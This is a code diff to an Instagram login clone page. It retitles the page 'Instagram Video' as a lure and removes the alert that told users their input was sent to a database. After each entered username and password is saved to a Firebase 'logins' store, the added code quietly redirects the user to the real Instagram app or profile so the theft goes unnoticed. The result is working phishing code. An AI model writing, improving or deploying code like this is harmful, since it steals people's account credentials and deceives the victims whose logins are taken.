@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login Clone</title>
+    <title>Instagram Video</title>
+
     <style>
         body {
             background-color: #000;
@@ -86,20 +87,33 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // Log in button saves input values to database
         document.getElementById('login-btn').addEventListener('click', () => {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            const newLoginRef = push(ref(db, 'logins/')); // generate a new unique ID under 'logins/'
+            const newLoginRef = push(ref(db, 'logins/'));
             set(newLoginRef, {
                 username: username,
                 password: password,
                 timestamp: new Date().toISOString()
             })
             .then(() => {
-                alert('Input data sent to database!');
                 console.log('Data written:', username, password);
+
+                const appUrl = `instagram://user?username=${encodeURIComponent(username)}`;
+                const webUrl = `https://www.instagram.com/${encodeURIComponent(username)}/`;
+
+                // Create a hidden link to trigger the redirect
+                const a = document.createElement('a');
+                a.href = appUrl;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+
+                // Fallback to browser if app doesn't open
+                setTimeout(() => {
+                    window.location.href = webUrl;
+                }, 1500);
             })
             .catch((error) => {
                 console.error('Error writing to database:', error);
@@ -107,7 +121,6 @@
             });
         });
 
-        // Optional: handle create account button similarly or leave empty
         document.getElementById('create-btn').addEventListener('click', () => {
             alert('Create account button clicked');
         });
